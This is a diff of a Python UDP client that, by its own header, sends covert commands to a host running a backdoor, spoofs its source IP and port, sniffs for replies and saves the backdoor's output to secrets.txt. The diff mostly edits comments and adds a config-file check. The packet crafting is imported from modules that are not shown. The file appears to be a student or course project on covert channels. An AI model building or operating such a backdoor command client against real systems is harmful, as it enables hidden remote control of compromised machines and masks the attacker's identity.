@@ -1,5 +1,5 @@
-#####################################################################################################################
-#  SOURCE FILE:		   client.py - A simple UDP client that sends covert and receives messages via a backdoor.
+# --------------------------------------------------------------------------------------------------------------------
+#  SOURCE FILE:		   client.py - A simple UDP client that sends and receives covert messages via a backdoor.
 #
 #  PROGRAM:		       client
 #
@@ -12,15 +12,13 @@
 #  PROGRAMMERS:        Slade Solobay & Zach Smoroden
 #
 #  NOTES:
-#  The program will send a covert message to a specific IP address (an IP running the backdoor.py) over a specific
-#  destination port. The program also has the ability to spoof the source port and source IP address. Once a command
-#  is sent the client will wait for a response from the backdoor and save the output to secrets.txt.
+#
 #
 #  OUTPUT: secrets.txt - will be saved in the program root directory.
 #
-#  USAGE: ./client -d [Destination IP] -p [Destination Port] -h [Source IP] -s [Source Port] -i [Interface]
-##
-#####################################################################################################################
+#  USAGE: ./client -d <Destination IP> -p [Destination Port] -b [Source IP] -s [Source Port] -i [Interface]
+#
+# --------------------------------------------------------------------------------------------------------------------
 import sys
 from client_utils import*
 from client_packet import*
@@ -28,6 +26,8 @@ import multiprocessing
 import getopt
 import datetime
 
+
+# Parse command line arguments
 try:
     opts, args = getopt.getopt(sys.argv[1:], 'd:p:b:s:i:h', ['dest=', 'dport=', 'src=', 'sport=', 'interface=', 'help'])
 except getopt.GetoptError:
@@ -57,11 +57,17 @@ if not packet['dest']:
     usage()
     sys.exit(2)
 
+# Did they provide a config file?
+if os.path.isfile('port_conf') is False:
+    usage()
+    sys.exit(2)
+
 try:
     with open(FILENAME, 'a') as f:
         f.write(datetime.datetime.now().strftime('Initiated Covert Console -- %I:%M:%S %b %d, %Y\n\n'))
     # Setup filter and start sniffing for replies
     packet_filter = "udp and src host {0}".format(packet['dest'])
+    # Our sniff function is blocking so run it in a new process
     sniff_process = multiprocessing.Process(target=sniff_packets, args=(packet_filter, ))
     sniff_process.start()
 
@@ -72,6 +78,7 @@ try:
             sniff_process.terminate()
             sys.exit(0)
         send_packet(packet)
+# Catch Ctrl+C and other keyboard interrupts
 except KeyboardInterrupt:
     sniff_process.terminate()
     sys.exit(1)
